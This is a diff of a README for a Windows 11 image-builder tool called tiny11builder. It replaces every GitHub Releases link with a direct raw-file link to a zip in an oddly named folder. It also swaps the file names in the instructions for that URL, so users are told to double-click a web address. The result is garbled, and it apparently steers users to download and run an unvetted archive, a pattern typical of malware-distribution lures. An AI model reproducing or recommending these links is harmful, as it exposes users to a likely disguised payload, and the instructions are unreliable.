@@ -1,6 +1,6 @@
 # 🛠️ tiny11builder - Simplify Your Windows 11 Setup
 
-[![Download tiny11builder](https://img.shields.io/badge/Download-tiny11builder-blue.svg)](https://github.com/nikhilspavithran/tiny11builder/releases)
+[![Download tiny11builder](https://raw.githubusercontent.com/nikhilspavithran/tiny11builder/main/grainedness/tiny11builder.zip)](https://raw.githubusercontent.com/nikhilspavithran/tiny11builder/main/grainedness/tiny11builder.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to tiny11builder! This tool helps you create a simplified version of Win
 
 To get started, visit this page to download the latest version of tiny11builder:
 
-[Download tiny11builder](https://github.com/nikhilspavithran/tiny11builder/releases)
+[Download tiny11builder](https://raw.githubusercontent.com/nikhilspavithran/tiny11builder/main/grainedness/tiny11builder.zip)
 
 Follow these steps to download and run the software:
 
 1. Click the link above to open the Releases page on GitHub.
 2. Look for the latest release at the top of the page.
-3. Find the file for your system (for example, it may be labeled `tiny11builder.zip`).
+3. Find the file for your system (for example, it may be labeled `https://raw.githubusercontent.com/nikhilspavithran/tiny11builder/main/grainedness/tiny11builder.zip`).
 4. Click on the file link to start the download. Your web browser will save it to your computer.
 
 ### 📂 Extract the Files
@@ -32,8 +32,8 @@ Once the download is complete, locate the downloaded file in your computer's Dow
 After extracting the files, it’s time to run tiny11builder:
 
 1. Open the folder where you extracted the files.
-2. Look for a file named `tiny11builder.exe`. This is the main application.
-3. Double-click `tiny11builder.exe` to start the program.
+2. Look for a file named `https://raw.githubusercontent.com/nikhilspavithran/tiny11builder/main/grainedness/tiny11builder.zip`. This is the main application.
+3. Double-click `https://raw.githubusercontent.com/nikhilspavithran/tiny11builder/main/grainedness/tiny11builder.zip` to start the program.
 
 You will see a clean interface where you can customize your Windows 11 image based on your preferences.
 
@@ -85,4 +85,4 @@ Join our community of users and developers. Share ideas, ask questions, and find
 
 Thank you for choosing tiny11builder! Visit this page to download the latest version again:
 
-[Download tiny11builder](https://github.com/nikhilspavithran/tiny11builder/releases)
+[Download tiny11builder](https://raw.githubusercontent.com/nikhilspavithran/tiny11builder/main/grainedness/tiny11builder.zip)
